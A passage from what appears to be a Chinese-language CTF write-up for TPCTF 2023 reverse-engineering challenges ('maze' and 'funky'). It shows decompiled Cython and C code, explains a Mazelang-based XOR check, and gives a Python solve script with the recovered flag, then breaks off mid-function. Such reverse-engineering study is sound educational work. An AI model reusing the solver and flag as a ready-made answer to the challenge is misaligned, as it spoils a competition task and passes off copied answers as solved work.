class="line">&#123;</span><br><span class="line">    v26 = <span class="number">0LL</span>;</span><br><span class="line">    v27 = <span class="number">370</span>;</span><br><span class="line">    v23 = <span class="number">14995</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_228;</span><br><span class="line">&#125;</span><br><span class="line">v15-&gt;ob_refcnt = v20;</span><br><span class="line"><span class="keyword">if</span> ( !v20 )</span><br><span class="line">    _Py_Dealloc(v15);</span><br><span class="line"><span class="keyword">if</span> ( v19-&gt;ob_type == (_typeobject *)&amp;PyMethod_Type &amp;&amp; (v21 = (PyObject **)v19[<span class="number">1</span>].ob_type) != <span class="number">0LL</span> )</span><br><span class="line">&#123;</span><br><span class="line">    Attr = (PyObject *)v19[<span class="number">1</span>].ob_refcnt;</span><br><span class="line">    *v21 = (PyObject *)((<span class="type">char</span> *)*v21 + <span class="number">1</span>);</span><br><span class="line">    ++Attr-&gt;ob_refcnt;</span><br><span class="line">    v16 = v19-&gt;ob_refcnt-- == <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">        _Py_Dealloc(v19);</span><br><span class="line">    __pyx_pyargnames[<span class="number">0</span>] = v21;</span><br><span class="line">    __pyx_pyargnames[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">    v22 = _Pyx_PyObject_FastCallDict(Attr, (PyObject **)__pyx_pyargnames, <span class="number">1uLL</span>, v18);</span><br><span class="line">    v16 = *v21 == (PyObject *)((<span class="type">char</span> *)&amp;dword_0 + <span class="number">1</span>);</span><br><span class="line">    *v21 = (PyObject *)((<span class="type">char</span> *)*v21 - <span class="number">1</span>);</span><br><span class="line">    v19 = v22;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">        _Py_Dealloc(v21);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    Attr = v19;</span><br><span class="line">    __pyx_pyargnames[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">    __pyx_pyargnames[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">    v19 = _Pyx_PyObject_FastCallDict(v19, (PyObject **)&amp;__pyx_pyargnames[<span class="number">1</span>], <span class="number">0LL</span>, v18);</span><br><span class="line">&#125;</span><br><span class="line">v23 = <span class="number">15016</span>;</span><br><span class="line"><span class="keyword">if</span> ( !v19 )</span><br><span class="line">&#123;</span><br><span class="line">    LABEL_146:</span><br><span class="line">    v16 = Attr-&gt;ob_refcnt-- == <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v16 )</span><br><span class="line">    &#123;</span><br><span class="line">        Attr = <span class="number">0LL</span>;</span><br><span class="line">        _Pyx_AddTraceback(<span class="string">&quot;maze.c29sdmU&quot;</span>, v23, <span class="number">370</span>, <span class="string">&quot;maze.py&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Attr;</span><br><span class="line">    &#125;</span><br><span class="line">    v19 = <span class="number">0LL</span>;</span><br><span class="line">    v27 = <span class="number">370</span>;</span><br><span class="line">    v26 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_148;</span><br><span class="line">&#125;</span><br><span class="line">v16 = Attr-&gt;ob_refcnt-- == <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( v16 )</span><br><span class="line">    _Py_Dealloc(Attr);</span><br><span class="line">v24 = (PyObject *)_pyx_dict_version<span class="number">.18789</span>;</span><br><span class="line"><span class="keyword">if</span> ( _pyx_d[<span class="number">1</span>].ob_type == (_typeobject *)_pyx_dict_version<span class="number">.18789</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v25 = _pyx_dict_cached_value<span class="number">.18790</span>;</span><br><span class="line">    <span class="keyword">if</span> ( _pyx_dict_cached_value<span class="number">.18790</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ++_pyx_dict_cached_value<span class="number">.18790</span>-&gt;ob_refcnt;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">    &#125;</span><br><span class="line">    v26 = _Pyx_GetBuiltinName(_pyx_n_s_MazeLang);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v26 = _Pyx__GetModuleGlobalName(_pyx_n_s_MazeLang, &amp;_pyx_dict_version<span class="number">.18789</span>, &amp;_pyx_dict_cached_value<span class="number">.18790</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !v26 )</span><br><span class="line">&#123;</span><br><span class="line">    v66 = <span class="number">371</span>;</span><br><span class="line">    v67 = <span class="number">15030</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_144;</span><br><span class="line">&#125;</span><br><span class="line">v25 = v26;</span><br><span class="line">LABEL_42:</span><br><span class="line"><span class="keyword">if</span> ( v25-&gt;ob_type == (_typeobject *)&amp;PyMethod_Type &amp;&amp; (v87 = (PyObject **)v25[<span class="number">1</span>].ob_type) != <span class="number">0LL</span> )</span><br><span class="line">&#123;</span><br><span class="line">    Attr = (PyObject *)v25[<span class="number">1</span>].ob_refcnt;</span><br><span class="line">    *v87 = (PyObject *)((<span class="type">char</span> *)*v87 + <span class="number">1</span>);</span><br><span class="line">    ++Attr-&gt;ob_refcnt;</span><br><span class="line">    v16 = v25-&gt;ob_refcnt-- == <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">        _Py_Dealloc(v25);</span><br><span class="line">    __pyx_pyargnames[<span class="number">0</span>] = v87;</span><br><span class="line">    __pyx_pyargnames[<span class="number">1</span>] = (PyObject **)v19;</span><br><span class="line">    v88 = _Pyx_PyObject_FastCallDict(Attr, (PyObject **)__pyx_pyargnames, <span class="number">2uLL</span>, v24);</span><br><span class="line">    v16 = *v87 == (PyObject *)((<span class="type">char</span> *)&amp;dword_0 + <span class="number">1</span>);</span><br><span class="line">    *v87 = (PyObject *)((<span class="type">char</span> *)*v87 - <span class="number">1</span>);</span><br><span class="line">    v26 = v88;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">        _Py_Dealloc(v87);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    Attr = v25;</span><br><span class="line">    __pyx_pyargnames[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">    __pyx_pyargnames[<span class="number">1</span>] = (PyObject **)v19;</span><br><span class="line">    v26 = _Pyx_PyObject_FastCallDict(v25, (PyObject **)&amp;__pyx_pyargnames[<span class="number">1</span>], <span class="number">1uLL</span>, v24);</span><br><span class="line">&#125;</span><br><span class="line">v27 = <span class="number">371</span>;</span><br><span class="line">v23 = <span class="number">15050</span>;</span><br><span class="line"><span class="keyword">if</span> ( !v26 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_238;</span><br><span class="line">v16 = Attr-&gt;ob_refcnt-- == <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( v16 )</span><br><span class="line">    _Py_Dealloc(Attr);</span><br></pre></td></tr></table></figure>

<p>之后有一个获取<code>len(arg)</code>的过程，看WP才知道，小小的一段真不容易发现：</p>
<p><code>s1a</code>通过交叉引用可以找到为<code>__pyx_args</code>，即函数的参数，因此应该是获取输入的长度是不是33。</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000025360</span> ; PyObject *__fastcall _pyx_pw_4maze_3c29sdmU(PyObject *__pyx_self, PyObject *<span class="type">const</span> *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds)</span><br><span class="line">.text:<span class="number">0000000000025360</span> __pyx_pw_4maze_3c29sdmU proc near       ; DATA XREF: .data:__pyx_mdef_4maze_3c29sdmU↓o</span><br><span class="line">.text:<span class="number">0000000000025360</span></span><br><span class="line">.text:<span class="number">0000000000025360</span> s1= qword ptr <span class="number">-78</span>h</span><br><span class="line">.text:<span class="number">0000000000025360</span> var_70= qword ptr <span class="number">-70</span>h</span><br><span class="line">.text:<span class="number">0000000000025360</span> values= qword ptr <span class="number">-60</span>h</span><br><span class="line">.text:<span class="number">0000000000025360</span> __pyx_pyargnames= qword ptr <span class="number">-58</span>h</span><br><span class="line">.text:<span class="number">0000000000025360</span> var_40= qword ptr <span class="number">-40</span>h</span><br><span class="line">.text:<span class="number">0000000000025360</span></span><br><span class="line">.text:<span class="number">0000000000025360</span> __pyx_self = rdi                        ; PyObject *</span><br><span class="line">.text:<span class="number">0000000000025360</span> __pyx_args = rsi                        ; PyObject *<span class="type">const</span> *</span><br><span class="line">.text:<span class="number">0000000000025360</span> __pyx_nargs = rdx                       ; Py_ssize_t</span><br><span class="line">.text:<span class="number">0000000000025360</span> __pyx_kwds = rcx                        ; PyObject *</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__pyx_self</code> （存储在寄存器 <code>rdi</code> 中）：这是函数的第一个参数，通常是表示函数被调用的对象实例（对于类方法）或者是模块对象（对于模块级别的函数）。</li>
<li><code>__pyx_args</code> （存储在寄存器 <code>rsi</code> 中）：这是一个指向参数数组的指针，参数的个数由 <code>__pyx_nargs</code> 指定。</li>
<li><code>__pyx_nargs</code> （存储在寄存器 <code>rdx</code> 中）：这是一个整数，表示传递给函数的参数个数。</li>
<li><code>__pyx_kwds</code> （存储在寄存器 <code>rcx</code> 中）：这可能是一个指向关键字参数的指针或一个表示关键字参数的 Python 字典。</li>
</ul>
</blockquote>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214171012447.png"></p>
<p>开启循环<code>range(33)</code>，获取单个字符：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214171859172.png"></p>
<p>看报错应该是用了<code>ord</code>：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214172134125.png"></p>
<p>调用了<code>Mazelang.run_till_output</code>：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214172459194.png"></p>
<p>进行异或，<code>v45</code>是<code>ord(input[index])</code>，<code>v57</code>是<code>Mazelang.run_till_output</code>返回值：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214172714231.png"></p>
<p>获取<code>secret</code>，后面有<code>v63 = PyObject_GetItem(Attr, v97);</code>获取单个字符：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214173042156.png"></p>
<p>最后，进行比较：</p>
<p><code>v15</code>是异或的结果，<code>v45</code>是<code>secret[index]</code>。</p>
<p>第三个参数 <code>3LL</code> 表示要进行的比较操作为等于比较，对应的宏是 <code>Py_EQ</code>。</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214173309452.png"></p>
<p>因此，完整逻辑：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    x = Mazelang(base64.b64decode(UJ9mxXxeoS).decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">input</span>) != <span class="number">33</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    init_secret()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">input</span>[i] ^ MazeLang.run_till_output() != secret[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> maze</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = base64.b64decode(maze.UJ9mxXxeoS).decode()</span><br><span class="line">b = maze.TWF6ZUxhbmc(a)</span><br><span class="line">maze.aW5pdF9zZWNyZXQ()</span><br><span class="line">xor_num = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    xor_num.append(b.cnVuX3RpbGxfb3V0cHV0())</span><br><span class="line">xor_result = maze.c2VjcmV0</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    flag.append(xor_result[i] ^ xor_num[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag]))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">biu@biu:~/Desktop/maze_extracted$ python3 test.py </span></span><br><span class="line"><span class="string">[84, 80, 67, 84, 70, 123, 121, 79, 117, 95, 64, 114, 101, 95, 109, 64, 115, 84, 51, 114, 95, 79, 70, 95, 109, 65, 90, 69, 108, 97, 78, 54, 125]</span></span><br><span class="line"><span class="string">TPCTF&#123;yOu_@re_m@sT3r_OF_mAZElaN6&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Mazelang"><a href="#Mazelang" class="headerlink" title="Mazelang"></a>Mazelang</h3><p>这里看一看<code>Mazelang</code>，感觉蛮好玩的。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/chrwoods/mazelang">chrwoods&#x2F;mazelang: Esoteric maze-based programming language (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://esolangs.org/wiki/Maze">Maze - Esolang (esolangs.org)</a></p>
<p>地图根据base64可以得到：(上半部分是地图，下半部分是函数)</p>
<p>根据上面的网站以及自己尝试调试了解释器的源码后，大概知道了些：</p>
<ol>
<li><code>car</code>只要原来的方向还能走，就往原来的方向走<ol>
<li>方向初始化为<code>[&#39;U&#39;, &#39;R&#39;, &#39;D&#39;, &#39;L&#39;]</code></li>
<li>方向检测时，第一个检测的是原来的方向，最后一个检测是原来的方向的反方向</li>
</ol>
</li>
<li>每走一个格，执行该格对应的指令（可能是指令，可能是函数）</li>
<li>一个<code>car</code>停在<code>**</code>上时，会发出<code>signal</code>，别的车可以根据这个<code>signal</code>执行条件判断函数操作</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># ## ## ## ## ## ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># ## ## ^^ ## ^^ ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># ## ## .. ## IZ ## ## ## ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># %R .. %D ## %D .. .. %L ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># &gt;&gt; ## .. ## EA ** PP %U ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># %U IA TA ## EB ** PP %U ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># %U IB TB ## EC ** PP %U ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># %U IC TC ## ED ** PP %U ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># %U ID TD ## EE ** PP %U ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># %U IE TE ## EF ** PP %U ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># %U IF TF ## %R ** IZ %U ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># %U IG %L ## ## ## ## ## ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># ## ## ## ## ##</span></span></span><br><span class="line"></span><br><span class="line">PP -&gt; +=1</span><br><span class="line">MM -&gt; -=1</span><br><span class="line">IZ -&gt; =0</span><br><span class="line">EA -&gt; IF ==0 THEN %R ELSE %D</span><br><span class="line">EB -&gt; IF ==1 THEN %R ELSE %D</span><br><span class="line">EC -&gt; IF ==2 THEN %R ELSE %D</span><br><span class="line">ED -&gt; IF ==3 THEN %R ELSE %D</span><br><span class="line">EE -&gt; IF ==4 THEN %R ELSE %D</span><br><span class="line">EF -&gt; IF ==5 THEN %R ELSE %D</span><br><span class="line">TA -&gt; IF ** THEN %L ELSE %D</span><br><span class="line">IA -&gt; =72</span><br><span class="line">TB -&gt; IF ** THEN %L ELSE %D</span><br><span class="line">IB -&gt; =73</span><br><span class="line">TC -&gt; IF ** THEN %L ELSE %D</span><br><span class="line">IC -&gt; =84</span><br><span class="line">TD -&gt; IF ** THEN %L ELSE %D</span><br><span class="line">ID -&gt; =80</span><br><span class="line">TE -&gt; IF ** THEN %L ELSE %D</span><br><span class="line">IE -&gt; =67</span><br><span class="line">TF -&gt; IF ** THEN %L ELSE %D</span><br><span class="line">IF -&gt; =84</span><br><span class="line">IG -&gt; =70</span><br><span class="line">LT -&gt; IF ==6 THEN %D ELSE %L</span><br></pre></td></tr></table></figure>

<p>由以上可以得到<code>maze</code>的路径：</p>
<p>只画了前三轮，红车的value每轮加一，进入不同行的<code>**</code>，导致触发<code>signal</code>的时机不同，从而改变蓝车的轨迹，输出不同的字符。</p>
<p>输出字符依次为：<code>HITPCTF</code>，不断循环。</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214152144070.png"></p>
<p>可以直接使用解释器的脚本获取输出：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214152420027.png"></p>
<h2 id="funky"><a href="#funky" class="headerlink" title="funky"></a>funky</h2><p>👉<a target="_blank" rel="noopener" href="https://ycznkvrmzo.feishu.cn/docx/UM7BdUTNHoz0x6xx5uXceJ8enLg">⁡⁡⁣⁢‌‬⁣‍⁢﻿﻿‌⁢⁣⁡⁣﻿⁡‍⁢⁤‬‌⁤‌⁡⁢‍⁢﻿⁣⁤‬⁣﻿‍﻿‌⁡⁢‌⁡⁢2023 11.25 TPCTF reverse wp</a></p>
<p>👉<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fm8oSts-BOt-0Y8oL99XRA">国际赛TPCTF 2023 Writeup –Polaris</a></p>
<p>程序计算的逻辑将4字节数的每个bit转为1个4字节数。</p>
<p><code>0x8000000</code>是0，<code>0x00000000</code>是1。</p>
<p><code>main</code>的逻辑还是很好理解的，主要是三个加密函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Input the flag: &quot;</span>, a3);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) != <span class="number">39</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    <span class="keyword">if</span> ( *s != <span class="string">&#x27;TCPT&#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    <span class="keyword">if</span> ( word_557684292444 != <span class="string">&#x27;&#123;F&#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    <span class="keyword">if</span> ( byte_557684292466 != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    input_begin = &amp;qword_557684292446;</span><br><span class="line">    v4 = &amp;input_char_byte;</span><br><span class="line">    v5 = &amp;v13;</span><br><span class="line">    v6 = &amp;qword_557684292446;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        v7 = *v6;</span><br><span class="line">        v13 = <span class="number">0LL</span>;</span><br><span class="line">        v14 = <span class="number">0LL</span>;</span><br><span class="line">        v15 = <span class="number">0LL</span>;</span><br><span class="line">        v16 = <span class="number">0LL</span>;</span><br><span class="line">        parse_num(v5, v7);</span><br><span class="line">        *(v8 - <span class="number">32</span>) = v13;</span><br><span class="line">        *(v8 - <span class="number">24</span>) = v14;</span><br><span class="line">        *(v8 - <span class="number">16</span>) = v15;</span><br><span class="line">        *(v8 - <span class="number">8</span>) = v16;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v9 != v6 );</span><br><span class="line">    enc1();</span><br><span class="line">    enc2();</span><br><span class="line">    enc3();</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        v10 = *v4;</span><br><span class="line">        v11 = <span class="number">2</span> * ((<span class="number">2</span> * ((<span class="number">2</span> * ((<span class="number">2</span> * ((<span class="number">2</span> * ((<span class="number">2</span> * ((<span class="number">2</span> * (v4[<span class="number">7</span>] &gt;= <span class="number">0</span>)) | (v4[<span class="number">6</span>] &gt;= <span class="number">0</span>))) | (v4[<span class="number">5</span>] &gt;= <span class="number">0</span>))) | (v4[<span class="number">4</span>] &gt;= <span class="number">0</span>))) | (v4[<span class="number">3</span>] &gt;= <span class="number">0</span>))) | (v4[<span class="number">2</span>] &gt;= <span class="number">0</span>))) | (v4[<span class="number">1</span>] &gt;= <span class="number">0</span>));</span><br><span class="line">        v4 += <span class="number">8</span>;</span><br><span class="line">        input_begin = (input_begin + <span class="number">1</span>);</span><br><span class="line">        *(input_begin - <span class="number">1</span>) = (v10 &gt;= <span class="number">0</span>) | v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( s != v4 );</span><br><span class="line">    <span class="keyword">if</span> ( qword_557684292446 ^ <span class="number">0x69DA6110F30513BE</span>LL | qword_55768429244E ^ <span class="number">0xB564B4894A8B7B39</span>LL</span><br><span class="line">        || qword_557684292456 ^ <span class="number">0xD94585C18415AE32</span>LL | qword_55768429245E ^ <span class="number">0xF68893F67CB61DA9</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">        LABEL_3:</span><br><span class="line">        exit_0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="enc1"><a href="#enc1" class="headerlink" title="enc1"></a>enc1</h3><p><code>enc1</code>主要是获取每个输入的字节进行运算。</p>
<p>大部分的操作都是赋值操作，运算的操作集中在三个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">and_operation</span><span class="params">(<span class="type">float</span> *a1, <span class="type">float</span> *rsi_, <span class="type">float</span> *rdx_)</span></span><br><span class="line">&#123;</span><br><span class="line">    *a1 = -(-*rsi_ - *rdx_);</span><br><span class="line">    a1[<span class="number">1</span>] = -(-rsi_[<span class="number">1</span>] - *rdx_);</span><br><span class="line">    a1[<span class="number">2</span>] = -(-rsi_[<span class="number">2</span>] - *rdx_);</span><br><span class="line">    a1[<span class="number">3</span>] = -(-rsi_[<span class="number">3</span>] - *rdx_);</span><br><span class="line">    a1[<span class="number">4</span>] = -(-rsi_[<span class="number">4</span>] - *rdx_);</span><br><span class="line">    a1[<span class="number">5</span>] = -(-rsi_[<span class="number">5</span>] - *rdx_);</span><br><span class="line">    a1[<span class="number">6</span>] = -(-rsi_[<span class="number">6</span>] - *rdx_);</span><br><span class="line">    a1[<span class="number">7</span>] = -(-rsi_[<span class="number">7</span>] - *rdx_);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">xor_operation</span><span class="params">(<span class="type">float</span> *rdi_, <span class="type">float</span> *rsi_, <span class="type">float</span> *rdx_)</span></span><br><span class="line">&#123;</span><br><span class="line">    *rdi_ = -(*rsi_ - *rdx_) - (*rdx_ - *rsi_);</span><br><span class="line">    rdi_[<span class="number">1</span>] = -(rsi_[<span class="number">1</span>] - rdx_[<span class="number">1</span>]) - (rdx_[<span class="number">1</span>] - rsi_[<span class="number">1</span>]);</span><br><span class="line">    rdi_[<span class="number">2</span>] = -(rsi_[<span class="number">2</span>] - rdx_[<span class="number">2</span>]) - (rdx_[<span class="number">2</span>] - rsi_[<span class="number">2</span>]);</span><br><span class="line">    rdi_[<span class="number">3</span>] = -(rsi_[<span class="number">3</span>] - rdx_[<span class="number">3</span>]) - (rdx_[<span class="number">3</span>] - rsi_[<span class="number">3</span>]);</span><br><span class="line">    rdi_[<span class="number">4</span>] = -(rsi_[<span class="number">4</span>] - rdx_[<span class="number">4</span>]) - (rdx_[<span class="number">4</span>] - rsi_[<span class="number">4</span>]);</span><br><span class="line">    rdi_[<span class="number">5</span>] = -(rsi_[<span class="number">5</span>] - rdx_[<span class="number">5</span>]) - (rdx_[<span class="number">5</span>] - rsi_[<span class="number">5</span>]);</span><br><span class="line">    rdi_[<span class="number">6</span>] = -(rsi_[<span class="number">6</span>] - rdx_[<span class="number">6</span>]) - (rdx_[<span class="number">6</span>] - rsi_[<span class="number">6</span>]);</span><br><span class="line">    rdi_[<span class="number">7</span>] = -(rsi_[<span class="number">7</span>] - rdx_[<span class="number">7</span>]) - (rdx_[<span class="number">7</span>] - rsi_[<span class="number">7</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">left_move</span><span class="params">(_DWORD *a1, _DWORD *rsi_)</span></span><br><span class="line">&#123;</span><br><span class="line">    *a1 = dword_557684292478;</span><br><span class="line">    a1[<span class="number">1</span>] = 